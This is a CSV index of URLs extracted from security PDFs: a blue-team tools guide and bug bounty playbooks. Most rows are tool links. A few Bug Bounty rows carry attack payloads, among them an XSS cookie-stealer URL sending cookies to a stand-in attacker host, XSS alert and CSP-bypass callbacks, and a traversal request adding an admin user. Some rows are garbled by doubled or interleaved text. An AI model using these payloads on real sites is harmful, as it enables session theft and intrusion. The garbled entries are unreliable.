pdf,page,url
Blue Team Tools.pdf,1,https://github.com/A-poc/RedTeam-Tools
Blue Team Tools.pdf,3,https://twitter.com/embee_research
Blue Team Tools.pdf,3,https://twitter.com/embee_research/status/1614871485931458560
Blue Team Tools.pdf,3,https://bluesoul.me/
Blue Team Tools.pdf,3,https://bluesoul.me/2016/05/12/use-gpo-to-change-the-default-behavior-of-potentially-malicious-file-extensions/
Blue Team Tools.pdf,3,https://www.howtogeek.com/author/davidmckay/
Blue Team Tools.pdf,3,https://www.howtogeek.com/devops/how-to-detect-and-defeat-cryptominers-in-your-network/
Blue Team Tools.pdf,3,https://nmap.org
Blue Team Tools.pdf,3,https://nmap.org/download
Blue Team Tools.pdf,4,https://www.stationx.net/nmap-cheat-sheet/
Blue Team Tools.pdf,4,https://kirelos.com/nmap-version-scan-determining-the-version-and-available-services/
Blue Team Tools.pdf,4,https://kirelos.com/nmap-version-scan-determining-the-version-and-
Blue Team Tools.pdf,4,https://nuclei.projectdiscovery.io/nuclei/get-started/
Blue Team Tools.pdf,4,https://github.com/projectdiscovery/nuclei.git
Blue Team Tools.pdf,4,https://example.com
Blue Team Tools.pdf,4,https://example.com
Blue Team Tools.pdf,4,https://nuclei.projectdiscovery.io/nuclei/get-started/#running-nuclei
Blue Team Tools.pdf,5,https://www.appsecsanta.com/nuclei
Blue Team Tools.pdf,5,https://www.appsecsanta.com/nuclei
Blue Team Tools.pdf,5,https://github.com/robertdavidgraham/masscan
Blue Team Tools.pdf,5,https://kalilinuxtutorials.com/masscan/
Blue Team Tools.pdf,5,https://kalilinuxtutorials.com/masscan/
Blue Team Tools.pdf,5,https://angryip.org/
Blue Team Tools.pdf,5,https://angryip.org/download/
Blue Team Tools.pdf,6,https://angryip.org/documentation/
Blue Team Tools.pdf,6,https://angryip.org/screenshots/
Blue Team Tools.pdf,6,https://angryip.org/screenshots/
Blue Team Tools.pdf,6,https://github.com/zmap/zmap
Blue Team Tools.pdf,6,https://github.com/zmap/zmap/releases
Blue Team Tools.pdf,6,https://github.com/zmap/zmap/wiki
Blue Team Tools.pdf,6,https://www.hackers-arise.com/post/zmap-for-scanning-the-internet-scan-the-entire-internet-in-45-minutes
Blue Team Tools.pdf,6,https://www.hackers-arise.com/post/zmap-for-scanning-
Blue Team Tools.pdf,6,https://www.shodan.io/dashboard
Blue Team Tools.pdf,6,https://www.shodan.io/dashboard
Blue Team Tools.pdf,6,https://help.shodan.io/the-basics/search-query-fundamentals
Blue Team Tools.pdf,6,https://www.shodan.io/search/examples
Blue Team Tools.pdf,6,https://www.osintme.com/index.php/2021/01/16/ultimate-osint-with-shodan-100-great-shodan-queries/
Blue Team Tools.pdf,7,https://www.shodan.io/
Blue Team Tools.pdf,7,https://www.shodan.io/
Blue Team Tools.pdf,7,https://openvas.org/
Blue Team Tools.pdf,7,https://127.0.0.1:9392
Blue Team Tools.pdf,7,https://127.0.0.1:9392
Blue Team Tools.pdf,7,https://www.kali.org/blog/openvas-vulnerability-scanning/
Blue Team Tools.pdf,7,https://www.kali.org/blog/openvas-vulnerability-scanning/
Blue Team Tools.pdf,7,https://www.tenable.com/products/nessus/nessus-essentials
Blue Team Tools.pdf,7,https://www.tenable.com/products/nessus/nessus-essentials
Blue Team Tools.pdf,7,https://www.tenable.com/products/nessus/nessus-professional
Blue Team Tools.pdf,8,https://docs.tenable.com/nessus/Content/GetStarted.htm
Blue Team Tools.pdf,8,https://www.tenable.com/plugins/search
Blue Team Tools.pdf,8,https://community.tenable.com/
Blue Team Tools.pdf,8,https://www.tenable.com
Blue Team Tools.pdf,8,https://www.tenable.com
Blue Team Tools.pdf,8,https://www.rapid7.com/products/nexpose/
Blue Team Tools.pdf,8,https://docs.rapid7.com/nexpose/install/
Blue Team Tools.pdf,8,https://docs.rapid7.com/nexpose/log-in-and-activate
Blue Team Tools.pdf,8,https://docs.rapid7.com/nexpose/create-and-scan-a-site
Blue Team Tools.pdf,8,https://www.rapid7.com/products/nexpose/
Blue Team Tools.pdf,8,https://www.rapid7.com/products/nexpose/
Blue Team Tools.pdf,8,https://www.hackerone.com/
Blue Team Tools.pdf,8,https://www.hackerone.com/product/bug-bounty-platform
Blue Team Tools.pdf,8,https://www.hackerone.com/product/bug-bounty-platform
Blue Team Tools.pdf,9,https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon
Blue Team Tools.pdf,9,https://download.sysinternals.com/files/Sysmon.zip
Blue Team Tools.pdf,9,https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon#event-filtering-entries
Blue Team Tools.pdf,9,https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon
Blue Team Tools.pdf,9,https://nsaneforums.com/topic/281207-sysmon-5-brings-registry-modification-logging/
Blue Team Tools.pdf,9,https://nsaneforums.com/topic/281207-sysmon-5-brings-registry-modification-
Blue Team Tools.pdf,9,https://www.elastic.co/kibana/
Blue Team Tools.pdf,9,https://www.elastic.co/downloads/kibana
Blue Team Tools.pdf,9,https://www.elastic.co/guide/en/kibana/current/install.html
Blue Team Tools.pdf,10,https://phoenixnap.com/kb/kibana-tutorial
Blue Team Tools.pdf,10,https://www.pinterest.co.uk/pin/analysing-honeypot-data-using-kibana-and-elasticsearch--684758318328369269/
Blue Team Tools.pdf,10,https://www.pinterest.co.uk/pin/analysing-
Blue Team Tools.pdf,10,https://www.elastic.co/logstash/
Blue Team Tools.pdf,10,https://www.elastic.co/downloads/logstash
Blue Team Tools.pdf,10,https://www.elastic.co/guide/en/logstash/current/introduction.html
Blue Team Tools.pdf,10,https://www.elastic.co/guide/en/logstash/current/config-examples.html
Blue Team Tools.pdf,10,https://www.elastic.co/guide/en/logstash/current/logstash-modules.html
Blue Team Tools.pdf,10,https://www.elastic.co/guide/en/logstash/current/logstash-modules.html
Blue Team Tools.pdf,10,https://github.com/domainaware/parsedmarc
Blue Team Tools.pdf,11,https://github.com/domainaware/parsedmarc
Blue Team Tools.pdf,11,https://github.com/domainaware/parsedmarc
Blue Team Tools.pdf,11,https://github.com/x0rz/phishing_catcher
Blue Team Tools.pdf,11,https://github.com/x0rz/phishing_catcher
Blue Team Tools.pdf,11,https://github.com/x0rz/phishing_catcher
Blue Team Tools.pdf,11,https://github.com/stamparm/maltrail
Blue Team Tools.pdf,11,https://maltraildemo.github.io/
Blue Team Tools.pdf,11,https://github.com/stamparm/maltrail.git
Blue Team Tools.pdf,11,https://github.com/stamparm/maltrail
Blue Team Tools.pdf,11,https://github.com/stamparm/maltrail
Blue Team Tools.pdf,11,https://github.com/palantir/windows-event-forwarding/tree/master/AutorunsToWinEventLog
Blue Team Tools.pdf,12,https://github.com/palantir/windows-event-forwarding/tree/master/AutorunsToWinEventLog
Blue Team Tools.pdf,12,https://live.sysinternals.com
Blue Team Tools.pdf,12,https://live.sysinternals.com
Blue Team Tools.pdf,12,https://www.detectionlab.network/usage/autorunstowineventlog/
Blue Team Tools.pdf,12,https://www.detectionlab.network/usage/autorunstowineventlog/
Blue Team Tools.pdf,12,https://github.com/godaddy/procfilter
Blue Team Tools.pdf,12,https://github.com/virustotal/yara
Blue Team Tools.pdf,12,https://msdn.microsoft.com/en-
Blue Team Tools.pdf,12,https://github.com/godaddy/procfilter/releases
Blue Team Tools.pdf,12,https://github.com/godaddy/procfilter/blob/master/files/procfilter.ini
Blue Team Tools.pdf,12,https://github.com/godaddy/procfilter#screenshots
Blue Team Tools.pdf,12,https://github.com/godaddy/procfilter
Blue Team Tools.pdf,12,https://github.com/godaddy/procfilter
Blue Team Tools.pdf,13,https://github.com/Velocidex/velociraptor
Blue Team Tools.pdf,13,https://github.com/Velocidex/velociraptor/releases
Blue Team Tools.pdf,13,https://docs.velociraptor.app/
Blue Team Tools.pdf,13,https://docs.velociraptor.app
Blue Team Tools.pdf,13,https://docs.velociraptor.app
Blue Team Tools.pdf,13,https://github.com/JPCERTCC/SysmonSearch
Blue Team Tools.pdf,13,https://github.com/JPCERTCC/SysmonSearch.git
Blue Team Tools.pdf,13,https://github.com/JPCERTCC/SysmonSearch/wiki/Install#elasticsearch-server-setup
Blue Team Tools.pdf,13,https://github.com/JPCERTCC/SysmonSearch/wiki/Install#kibana-server-setup
Blue Team Tools.pdf,13,https://github.com/JPCERTCC/SysmonSearch/wiki/Install
Blue Team Tools.pdf,14,https://blogs.jpcert.or.jp/ja/2018/09/SysmonSearch.html
Blue Team Tools.pdf,14,https://blogs.jpcert.or.jp/ja/2018/09/SysmonSearch.html
Blue Team Tools.pdf,14,https://blogs.jpcert.or.jp/ja/2018/09/SysmonSearch.html
Blue Team Tools.pdf,14,https://lolbas-project.github.io/
Blue Team Tools.pdf,14,https://lolbas-project.github.io/
Blue Team Tools.pdf,14,https://lolbas-project.github.io/
Blue Team Tools.pdf,14,https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/
Blue Team Tools.pdf,14,https://lolbas-project.github.io/lolbas/Binaries/Certutil/
Blue Team Tools.pdf,14,https://lolbas-project.github.io/lolbas/Binaries/Cscript/
Blue Team Tools.pdf,14,https://lolbas-project.github.io/
Blue Team Tools.pdf,14,https://lolbas-project.github.io/
Blue Team Tools.pdf,14,https://gtfobins.github.io/
Blue Team Tools.pdf,14,https://gtfobins.github.io/
Blue Team Tools.pdf,14,https://gtfobins.github.io/
Blue Team Tools.pdf,14,https://gtfobins.github.io/gtfobins/base64/
Blue Team Tools.pdf,14,https://gtfobins.github.io/gtfobins/curl/
Blue Team Tools.pdf,14,https://gtfobins.github.io/gtfobins/nano/
Blue Team Tools.pdf,15,https://gtfobins.github.io/
Blue Team Tools.pdf,15,https://gtfobins.github.io/
Blue Team Tools.pdf,15,https://filesec.io/
Blue Team Tools.pdf,15,https://filesec.io/
Blue Team Tools.pdf,15,https://filesec.io/
Blue Team Tools.pdf,15,https://filesec.io/docm
Blue Team Tools.pdf,15,https://filesec.io/iso
Blue Team Tools.pdf,15,https://filesec.io/ppam
Blue Team Tools.pdf,15,https://filesec.io/
Blue Team Tools.pdf,15,https://filesec.io/
Blue Team Tools.pdf,15,https://www.kqlsearch.com/
Blue Team Tools.pdf,15,https://twitter.com/ugurkocde
Blue Team Tools.pdf,15,https://www.kqlsearch.com/
Blue Team Tools.pdf,15,https://www.kqlsearch.com/
Blue Team Tools.pdf,15,https://learn.microsoft.com/en-us/azure/data-explorer/kusto/query/
Blue Team Tools.pdf,15,https://www.kqlsearch.com/
Blue Team Tools.pdf,15,https://www.kqlsearch.com/
Blue Team Tools.pdf,15,https://unprotect.it/about/
Blue Team Tools.pdf,16,https://unprotect.it/
Blue Team Tools.pdf,16,https://unprotect.it/
Blue Team Tools.pdf,16,https://unprotect.it/api/
Blue Team Tools.pdf,16,https://unprotect.it/map/
Blue Team Tools.pdf,16,https://unprotect.it/map/
Blue Team Tools.pdf,16,https://github.com/WithSecureLabs/chainsaw
Blue Team Tools.pdf,16,https://github.com/countercept/chainsaw.git
Blue Team Tools.pdf,16,https://github.com/SigmaHQ/sigma
Blue Team Tools.pdf,16,https://github.com/sbousseaden/EVTX-ATTACK-SAMPLES.git
Blue Team Tools.pdf,16,https://twitter.com/FranticTyping/status/1433386064429916162/
Blue Team Tools.pdf,16,https://twitter.com/FranticTyping/status/1433386064429916162/
Blue Team Tools.pdf,16,https://github.com/MarkBaggett/freq
Blue Team Tools.pdf,17,https://github.com/MarkBaggett/freq
Blue Team Tools.pdf,17,https://github.com/Neo23x0/yarGen
Blue Team Tools.pdf,17,https://github.com/Neo23x0/yarGen/releases
Blue Team Tools.pdf,17,https://github.com/Neo23x0/yarGen#examples
Blue Team Tools.pdf,17,https://github.com/Neo23x0/yarGen
Blue Team Tools.pdf,17,https://github.com/Neo23x0/yarGen
Blue Team Tools.pdf,17,https://github.com/keraattin/EmailAnalyzer
Blue Team Tools.pdf,17,https://github.com/keraattin/EmailAnalyzer
Blue Team Tools.pdf,18,https://github.com/keraattin/EmailAnalyzer
Blue Team Tools.pdf,18,https://github.com/keraattin/EmailAnalyzer
Blue Team Tools.pdf,18,https://github.com/nccgroup/VCG
Blue Team Tools.pdf,18,https://www.maltego.com/solutions/cyber-threat-intelligence/
Blue Team Tools.pdf,19,https://www.maltego.com/get-a-demo/
Blue Team Tools.pdf,19,https://static.maltego.com/cdn/Handbooks/Maltego-Handbook-for-Cyber-Threat-Intelligence.pdf
Blue Team Tools.pdf,19,https://www.maltego.com/reduce-your-cyber-security-risk-with-maltego/
Blue Team Tools.pdf,19,https://www.maltego.com/reduce-your-cyber-security-risk-with-maltego/
Blue Team Tools.pdf,19,https://www.misp-project.org/
Blue Team Tools.pdf,19,https://raw.githubusercontent.com/MISP/MISP/2.4/INSTALL/INSTALL.sh
Blue Team Tools.pdf,19,https://raw.githubusercontent.com/MISP/MISP/2.4/INSTALL/INSTALL.sh
Blue Team Tools.pdf,19,https://misp.github.io/MISP/
Blue Team Tools.pdf,19,https://www.misp-project.org/documentation/
Blue Team Tools.pdf,19,https://github.com/MISP/misp-book
Blue Team Tools.pdf,19,https://www.misp-project.org/misp-training/cheatsheet.pdf
Blue Team Tools.pdf,19,http://www.concordia-h2020.eu/blog-post/integration-of-misp-into-flowmon-ads/
Blue Team Tools.pdf,19,http://www.concordia-h2020.eu/blog-post/integration-of-misp-into-flowmon-ads/
Blue Team Tools.pdf,19,https://threatconnect.com/threat-intelligence-platform/
Blue Team Tools.pdf,20,https://threatconnect.com/request-a-demo/
Blue Team Tools.pdf,20,https://threatconnect.com/wp-content/uploads/2022/12/Intel-Analysts-Datasheet.pdf
Blue Team Tools.pdf,20,https://threatconnect.com/threat-intelligence-platform/
Blue Team Tools.pdf,20,https://threatconnect.com/threat-intelligence-platform/
Blue Team Tools.pdf,20,https://www.nist.gov/cyberframework
Blue Team Tools.pdf,20,https://csrc.nist.gov/Projects/cybersecurity-framework/nist-cybersecurity-framework-a-quick-start-guide
Blue Team Tools.pdf,20,https://nvlpubs.nist.gov/nistpubs/CSWP/NIST.CSWP.04162018.pdf
Blue Team Tools.pdf,20,https://www.ftc.gov/business-guidance/resources/data-breach-response-guide-business
Blue Team Tools.pdf,20,https://www.nist.gov/cyberframework/events-and-presentations
Blue Team Tools.pdf,20,https://www.twitter.com/NISTcyber
Blue Team Tools.pdf,20,https://www.dell.com/en-us/blog/strengthen-security-of-your-data-center-with-the-nist-cybersecurity-framework/
Blue Team Tools.pdf,20,https://www.dell.com/en-us/blog/strengthen-security-
Blue Team Tools.pdf,21,https://www.ncsc.gov.uk/collection/incident-management/incident-response
Blue Team Tools.pdf,21,https://www.sans.org/information-security-policy/
Blue Team Tools.pdf,21,https://www.sans.org/white-papers/33901/
Blue Team Tools.pdf,21,https://frsecure.com/incident-response-plan-template/
Blue Team Tools.pdf,21,https://www.cisa.gov/cyber-incident-response
Blue Team Tools.pdf,21,https://www.fbi.gov/file-repository/incident-response-policy.pdf/view
Blue Team Tools.pdf,21,https://www.ncsc.gov.uk/collection/incident-management/incident-response
Blue Team Tools.pdf,21,https://www.ncsc.gov.uk/collection/incident-management/incident-response
Blue Team Tools.pdf,21,https://www.ncsc.gov.uk/guidance/mitigating-malware-and-ransomware-attacks
Blue Team Tools.pdf,21,https://csrc.nist.gov/Projects/ransomware-protection-and-response
Blue Team Tools.pdf,21,https://www.cisa.gov/stopransomware/ransomware-guide
Blue Team Tools.pdf,21,https://www.microsoft.com/en-us/security/blog/2019/12/16/ransomware-response-to-pay-or-not-to-pay/
Blue Team Tools.pdf,21,https://www.msp360.com/resources/blog/designing-a-ransomware-response-plan/
Blue Team Tools.pdf,22,https://csrc.nist.gov/Projects/ransomware-protection-and-response
Blue Team Tools.pdf,22,https://csrc.nist.gov/Projects/ransomware-protection-and-response
Blue Team Tools.pdf,22,https://www.virustotal.com/gui/home/search
Blue Team Tools.pdf,22,https://www.virustotal.com/gui/home/search
Blue Team Tools.pdf,22,https://www.virustotal.com/gui/home/search
Blue Team Tools.pdf,22,https://support.virustotal.com/hc/en-us/categories/360000162878-Documentation
Blue Team Tools.pdf,22,https://storage.googleapis.com/vtpublic/reports/VTI%20Cheatsheet.pdf
Blue Team Tools.pdf,22,https://www.virustotal.com/gui/home/search
Blue Team Tools.pdf,22,https://www.virustotal.com/gui/home/search
Blue Team Tools.pdf,22,https://hex-rays.com/ida-free/
Blue Team Tools.pdf,23,https://hex-rays.com/ida-free/#download
Blue Team Tools.pdf,23,https://github.com/AdamTaguirov/IDA-practical-cheatsheet
Blue Team Tools.pdf,23,https://gist.github.com/icecr4ck/7a7af3277787c794c66965517199fc9c
Blue Team Tools.pdf,23,https://hex-rays.com/products/ida/support/freefiles/IDA_Pro_Shortcuts.pdf
Blue Team Tools.pdf,23,https://www.newton.com.tw/wiki/IDA%20Pro
Blue Team Tools.pdf,23,https://www.newton.com.tw/wiki/IDA%20Pro
Blue Team Tools.pdf,23,https://ghidra-sre.org/
Blue Team Tools.pdf,23,https://github.com/NationalSecurityAgency/ghidra/releases
Blue Team Tools.pdf,23,https://ghidra-sre.org/InstallationGuide.html#Install
Blue Team Tools.pdf,23,https://ghidra-sre.org/InstallationGuide.html#Troubleshooting
Blue Team Tools.pdf,24,https://www.malwaretech.com/2019/03/video-first-look-at-ghidra-nsa-reverse-engineering-tool.html
Blue Team Tools.pdf,24,https://www.malwaretech.com/2019/03/video-first-look-at-ghidra-
Blue Team Tools.pdf,24,https://www.ccleaner.com/recuva
Blue Team Tools.pdf,24,https://www.ccleaner.com/recuva
Blue Team Tools.pdf,24,https://toolbox.iskysoft.com/data-recovery-tips/recuva-windows-10.html
Blue Team Tools.pdf,24,https://www.softpedia.com/blog/recuva-explained-usage-video-and-download-503681.shtml
Blue Team Tools.pdf,24,https://www.softpedia.com/blog/recuva-explained-usage-video-and-
Blue Team Tools.pdf,24,https://extundelete.sourceforge.net/
Blue Team Tools.pdf,24,https://sourceforge.net/project/platformdownload.php?group_id=260221
Blue Team Tools.pdf,24,https://extundelete.sourceforge.net/options.html
Blue Team Tools.pdf,25,https://theevilbit.blogspot.com/2013/01/backtrack-forensics-ext34-file-recovery.html
Blue Team Tools.pdf,25,https://theevilbit.blogspot.com/2013/01/backtrack-forensics-ext34-file-
Blue Team Tools.pdf,25,https://www.cgsecurity.org/wiki/TestDisk_Download
Blue Team Tools.pdf,25,https://www.cgsecurity.org/wiki/TestDisk_Download
Blue Team Tools.pdf,25,https://www.cgsecurity.org/wiki/Data_Recovery_Examples
Blue Team Tools.pdf,25,https://www.cgsecurity.org/wiki/TestDisk_Step_By_Step
Blue Team Tools.pdf,25,https://www.cgsecurity.org/testdisk.pdf
Blue Team Tools.pdf,25,https://www.cgsecurity.org/wiki/
Blue Team Tools.pdf,25,https://www.cgsecurity.org/wiki/
Blue Team Tools.pdf,25,https://www.sans.org/tools/sift-workstation/
Blue Team Tools.pdf,25,https://www.sans.org/tools/sift-workstation/
Blue Team Tools.pdf,25,https://www.sans.org/tools/sift-workstation/
Blue Team Tools.pdf,26,https://www.sans.org/tools/sift-workstation/
Blue Team Tools.pdf,26,https://www.sans.org/posters/sift-cheat-sheet/
Blue Team Tools.pdf,26,https://securityboulevard.com/2020/08/how-to-install-sift-workstation-and-remnux-on-the-same-system-for-forensics-and-malware-analysis/
Blue Team Tools.pdf,26,https://securityboulevard.com/2020/08/how-to-install-sift-workstation-and-remnux-on-the-same-system-for-forensics-and-malware-analysis/
Blue Team Tools.pdf,26,https://sleuthkit.org/sleuthkit/
Blue Team Tools.pdf,26,https://sleuthkit.org/sleuthkit/download.php
Blue Team Tools.pdf,26,https://sleuthkit.org/sleuthkit/docs.php
Blue Team Tools.pdf,26,http://www.effecthacking.com/2016/09/the-sleuth-kit-digital-forensic-tool.html
Blue Team Tools.pdf,26,http://www.effecthacking.com/2016/09/the-sleuth-kit-digital-forensic-tool.html
Blue Team Tools.pdf,26,https://www.autopsy.com/
Blue Team Tools.pdf,27,https://www.autopsy.com/download/
Blue Team Tools.pdf,27,http://sleuthkit.org/autopsy/docs/user-docs/4.19.3//
Blue Team Tools.pdf,27,https://www.sans.org/blog/a-step-by-step-introduction-to-using-the-autopsy-forensic-browser/
Blue Team Tools.pdf,27,https://www.kitploit.com/2014/01/autopsy-digital-investigation-analysis.html
Blue Team Tools.pdf,27,https://www.kitploit.com/2014/01/autopsy-digital-investigation-analysis.html
Blue Team Tools.pdf,27,https://tryhackme.com/dashboard
Blue Team Tools.pdf,27,https://tryhackme.com/
Blue Team Tools.pdf,27,https://tryhackme.com/
Blue Team Tools.pdf,27,https://docs.tryhackme.com/docs/teaching/teaching-getting-started/
Blue Team Tools.pdf,27,https://tryhackme.com/path-action/presecurity/join
Blue Team Tools.pdf,27,https://tryhackme.com/path-action/introtocyber/join
Blue Team Tools.pdf,27,https://tryhackme.com/hacktivities
Blue Team Tools.pdf,27,https://www.hostingadvice.com/blog/learn-cybersecurity-with-tryhackme/
Blue Team Tools.pdf,27,https://www.hostingadvice.com/blog/learn-cybersecurity-with-tryhackme/
Blue Team Tools.pdf,27,https://www.hackthebox.com/
Blue Team Tools.pdf,28,https://app.hackthebox.com/login
Blue Team Tools.pdf,28,https://app.hackthebox.com/login
Blue Team Tools.pdf,28,https://help.hackthebox.com/en/articles/5185158-introduction-to-hack-the-box
Blue Team Tools.pdf,28,https://www.hackthebox.com/blog/learn-to-hack-beginners-bible
Blue Team Tools.pdf,28,https://help.hackthebox.com/en/articles/6007919-introduction-to-starting-point
Blue Team Tools.pdf,28,https://www.hackthebox.com/login
Blue Team Tools.pdf,28,https://www.hackthebox.com/login
Blue Team Tools.pdf,28,https://cofense.com/product-services/phishme/
Blue Team Tools.pdf,28,https://go.cofense.com/live-demo/
Blue Team Tools.pdf,28,https://cofense.com/blog/
Blue Team Tools.pdf,28,https://cofense.com/knowledge-center-hub/
Blue Team Tools.pdf,28,https://cofense.com/product-services/phishme/
Blue Team Tools.pdf,28,https://cofense.com/product-services/phishme/
Blue Team Tools.pdf,28,https://twitter.com/
Blue Team Tools.pdf,29,https://twitter.com/vxunderground
Blue Team Tools.pdf,29,https://twitter.com/Alh4zr3d
Blue Team Tools.pdf,29,https://twitter.com/3xp0rtblog
Blue Team Tools.pdf,29,https://twitter.com/C5pider
Blue Team Tools.pdf,29,https://twitter.com/_JohnHammond
Blue Team Tools.pdf,29,https://twitter.com/mrd0x
Blue Team Tools.pdf,29,https://twitter.com/TheHackersNews
Blue Team Tools.pdf,29,https://twitter.com/pancak3stack
Blue Team Tools.pdf,29,https://twitter.com/GossiTheDog
Blue Team Tools.pdf,29,https://twitter.com/briankrebs
Blue Team Tools.pdf,29,https://twitter.com/SwiftOnSecurity
Blue Team Tools.pdf,29,https://twitter.com/schneierblog
Blue Team Tools.pdf,29,https://twitter.com/mikko
Blue Team Tools.pdf,29,https://twitter.com/campuscodi
Blue Team Tools.pdf,29,https://developers.facebook.com/docs/threat-exchange/getting-started
Blue Team Tools.pdf,29,https://developers.facebook.com/products/threat-exchange/
Blue Team Tools.pdf,29,https://developers.facebook.com/products/threat-exchange/
Blue Team Tools.pdf,29,https://developers.facebook.com/docs/threat-exchange/getting-started
Blue Team Tools.pdf,29,https://developers.facebook.com/docs/threat-exchange/ui
Blue Team Tools.pdf,29,https://developers.facebook.com/docs/threat-exchange/reference/apis
Blue Team Tools.pdf,29,https://github.com/facebook/ThreatExchange/tree/main/python-threatexchange
Bug Bounty Playbook V2v.pdf,13,https://builtwith.com/https://builtwith.com/”
Bug Bounty Playbook V2v.pdf,18,https://github.com/offensive-security/exploitdbhttps://github.com/offensive-security/exploitdb
Bug Bounty Playbook V2v.pdf,19,https://nvd.nist.gov/vuln/searchhttps://nvd.nist.gov/vuln/search
Bug Bounty Playbook V2v.pdf,21,https://www.exploit-db.com/https://www.exploit-db.com/
Bug Bounty Playbook V2v.pdf,26,https://github.com/droope/droopescanhttps://github.com/droope/droopescan
Bug Bounty Playbook V2v.pdf,27,https://github.com/rezasp/joomscanhttps://github.com/rezasp/joomscan
Bug Bounty Playbook V2v.pdf,28,https://github.com/0ang3el/aem-hackerhttps://github.com/0ang3el/aem-hacker
Bug Bounty Playbook V2v.pdf,30,https://www.exploit-db.com/https://www.exploit-db.com/
Bug Bounty Playbook V2v.pdf,31,https://github.com/steverobbins/magescanhttps://github.com/steverobbins/magescan
Bug Bounty Playbook V2v.pdf,36,https://github.com/EdOverflow/can-i-take-over-xyz
Bug Bounty Playbook V2v.pdf,36,https://github.com/EdOverflow/can-i-take-over-xyz
Bug Bounty Playbook V2v.pdf,58,https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentialshttps://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials
Bug Bounty Playbook V2v.pdf,60,https://github.com/vanhauser-thc/thc-hydrahttps://github.com/vanhauser-thc/thc-hydra
Bug Bounty Playbook V2v.pdf,62,https://portswigger.net/burphttps://portswigger.net/burp
Bug Bounty Playbook V2v.pdf,76,https://github.com/danielmiessler/SecLists/tree/master/Fuzzinghttps://github.com/danielmiessler/SecLists/tree/master/Fuzzing
Bug Bounty Playbook V2v.pdf,84,https://github.com/sqlmapproject/sqlmaphttps://github.com/sqlmapproject/sqlmap
Bug Bounty Playbook V2v.pdf,119,http://attacker-domain.comhttp://attacker-domain.com”
Bug Bounty Playbook V2v.pdf,119,http://attacker-domain/cookiestealer?cookie='+document.coodocument.location='http://attacker-domain/cookiestealer?cookie='+document.coo
Bug Bounty Playbook V2v.pdf,146,https://graphql.org/learn/introspection/
Bug Bounty Playbook V2v.pdf,146,https://graphql.org/learn/introspection/
Bug Bounty Playbook V2v.pdf,147,"http://example.com/graphql?query={TYPE_1{FIELD_1,FIELD_2http://example.com/graphql?query={TYPE_1{FIELD_1,FIELD_2"
Bug Bounty Playbook V2v.pdf,155,https://github.com/AresS31/jwtcathttps://github.com/AresS31/jwtcat
Bug Bounty Playbook V2v.pdf,155,https://github.com/lmammino/jwt-crackerhttps://github.com/lmammino/jwt-cracker
Bug Bounty Playbook V2v.pdf,155,https://github.com/mazen160/jwt-pwnhttps://github.com/mazen160/jwt-pwn
Bug Bounty Playbook V2v.pdf,155,https://github.com/brendan-rius/c-jwt-crackerhttps://github.com/brendan-rius/c-jwt-cracker
Bug Bounty Playbook V2v.pdf,178,http://your-swagger-url/?url=%3Cscript%3Ealert(atob(%22SGVyZSBpcyB0aGUgWFNThttp://your-swagger-url/?url=%3Cscript%3Ealert(atob(%22SGVyZSBpcyB0aGUgWFNT
Bug Bounty Playbook V2v.pdf,178,https://github.com/swagger-api/swagger-ui/issues/1262https://github.com/swagger-api/swagger-ui/issues/1262
Bug Bounty Playbook V2v.pdf,178,http://your-//your-swaggerswagger-url/?u-url/?url=htrl=https://tps://attackattacker
Bug Bounty Playbook V2v.pdf,178,https://git//github.comhub.com/swagge/swagger-api/r-api/swaggerswagger-ui/is-ui/issues/38sues/384747
Bug Bounty Playbook V2v.pdf,179,https://www.postman.com/downloads/https://www.postman.com/downloads/
Bug Bounty Playbook V2v.pdf,183,https://www.soapui.org/downloads/soapui/https://www.soapui.org/downloads/soapui/
Bug Bounty Playbook V2v.pdf,221,http://127.0.0.1:5000/?vuln_param=../../admin/add?username=ghost%26password=lulzhttp://127.0.0.1:5000/?vuln_param=../../admin/add?username=ghost%26password=lulz
Bug Bounty Playbook V2v.pdf,233,http://examSYSTEM
Bug Bounty Playbook V2v.pdf,233,"http://example.com"""
Bug Bounty Playbook V2v.pdf,241,https://www.google.comsafe-eval'
Bug Bounty Playbook V2v.pdf,241,https://www.google.com
Bug Bounty Playbook V2v.pdf,241,http://www.google-analytics.com/gtm/js
Bug Bounty Playbook V2v.pdf,241,https://*.gs
Bug Bounty Playbook V2v.pdf,241,http://www.google-analytics.com/gtm/js
Bug Bounty Playbook V2v.pdf,241,https://*.gs
Bug Bounty Playbook V2v.pdf,241,https://accounts.google.com
Bug Bounty Playbook V2v.pdf,241,https://accounts.google.com
Bug Bounty Playbook V2v.pdf,242,https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)https://accounts.google.com/o/oauth2/revoke?callback=alert(1337
Bug Bounty Playbook V2v.pdf,243,https://wwwhttps://www.google.com
Bug Bounty Playbook V2v.pdf,243,http://wwwhttp://www.google-analytics.com/gtm/js.google-analytics.com/gtm/js
Bug Bounty Playbook V2v.pdf,243,https://*.gstatic.com/feedback/https://*.gstatic.com/feedback/
Bug Bounty Playbook V2v.pdf,243,https://accounts.google.comhttps://accounts.google.com
Bug Bounty Playbook V2v.pdf,243,http://something.example.com/?vuln_param=javascript:alert(1)http://something.example.com/?vuln_param=javascript:alert(1
Bug Bounty Playbook V2v.pdf,243,http://something.example.com/?vuln_param=https://accounts.google.com/o/oauth2/revohttp://something.example.com/?vuln_param=https://accounts.google.com/o/oauth2/revo
Bug Bounty Playbook V2v.pdf,244,http://example.com/?vuln=something_vuln_csphttp://example.com/?vuln=something_vuln_csp
Bug Bounty Playbook V2v.pdf,244,https://csp.example.comhttps://csp.example.com
Bug Bounty Playbook v1.pdf,16,https://aws.amazon.com/
Bug Bounty Playbook v1.pdf,16,https://www.digitalocean.com/
Bug Bounty Playbook v1.pdf,16,https://www.ovh.com/
Bug Bounty Playbook v1.pdf,16,https://www.a2hosting.com/
Bug Bounty Playbook v1.pdf,16,https://libertyvps.net/
Bug Bounty Playbook v1.pdf,17,https://www.virtualbox.org/
Bug Bounty Playbook v1.pdf,17,https://www.vmware.com/
Bug Bounty Playbook v1.pdf,17,https://www.kali.org/downloads/
Bug Bounty Playbook v1.pdf,20,https://github.com/tanprathan/OWASP-Testing-Checklist
Bug Bounty Playbook v1.pdf,22,https://www.notion.so/
Bug Bounty Playbook v1.pdf,22,https://github.com/puneetsl/lotion
Bug Bounty Playbook v1.pdf,26,https://pentest.ws/
